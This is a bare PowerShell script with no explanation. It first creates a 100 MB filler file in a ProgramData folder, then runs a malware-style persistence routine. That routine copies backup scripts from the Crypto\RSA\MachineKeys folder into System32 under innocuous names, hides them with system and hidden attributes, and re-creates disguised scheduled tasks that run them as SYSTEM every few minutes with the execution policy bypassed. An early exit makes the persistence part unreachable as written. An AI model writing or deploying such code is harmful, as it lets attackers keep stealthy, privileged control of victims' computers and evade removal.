$TargetDir = "C:\ProGramData\tennp"
$SizeBytes = 100 * 1024 * 1024   # 100 MB

# Ensure directory exists
if (-not (Test-Path $TargetDir)) {
    New-Item -ItemType Directory -Path $TargetDir | Out-Null
}

# Unique filename
$fname = "temp_" + (Get-Date -Format "yyyyMMdd_HHmmss") + "_" + ((Get-Random).ToString("X")) + ".bin"
$fullPath = Join-Path $TargetDir $fname

# Try fast native tool fsutil first (creates file with given length)
try {
    & fsutil file createnew $fullPath $SizeBytes
    exit 0
} catch {
    # fallback: create empty file and set length via .NET
    try {
        $fs = [System.IO.File]::Open($fullPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write, [System.IO.FileShare]::None)
        $fs.SetLength([int64]$SizeBytes)
        $fs.Close()
        exit 0
    } catch {
        # if both methods fail, exit nonzero
        exit 1
    }
}

#restore files that were in task scheduler
$backupPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"
$restoreDir = "$env:windir\System32\Com\en-US"

# Check for WinUserCheck task
$hasTask1 = $true
try {
    schtasks /Query /TN "WinUserCheck" > $null
} catch {
    $hasTask1 = $false
}

if (-not $hasTask1) {
    Write-Host "[+] WinUserCheck task is missing — restoring..."
    if (-not (Test-Path "$restoreDir\sys_usr.ps1")) {
        Write-Host "[+] sys_usr.ps1 is missing — restoring from backup"
        Copy-Item "$backupPath\win_ux.ps1" "$restoreDir\sys_usr.ps1" -Force
        attrib +h +s "$restoreDir\sys_usr.ps1"
    }

    schtasks /Create /TN "WinUserCheck" /SC MINUTE /MO 3 /RL HIGHEST /F `
        /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_usr.ps1`"" /RU SYSTEM
}

# Check for WinWindowKill task
$hasTask2 = $true
try {
    schtasks /Query /TN "WinWindowKill" > $null
} catch {
    $hasTask2 = $false
}

if (-not $hasTask2) {
    Write-Host "[+] WinWindowKill task is missing — restoring..."
    if (-not (Test-Path "$restoreDir\sys_win.ps1")) {
        Write-Host "[+] sys_win.ps1 is missing — restoring from backup"
        Copy-Item "$backupPath\win_ui.ps1" "$restoreDir\sys_win.ps1" -Force
        attrib +h +s "$restoreDir\sys_win.ps1"
    }

    schtasks /Create /TN "WinWindowKill" /SC MINUTE /MO 13 /RL HIGHEST /F `
        /TR "powershell.exe -ExecutionPolicy Bypass -File `"$restoreDir\sys_win.ps1`"" /RU SYSTEM
}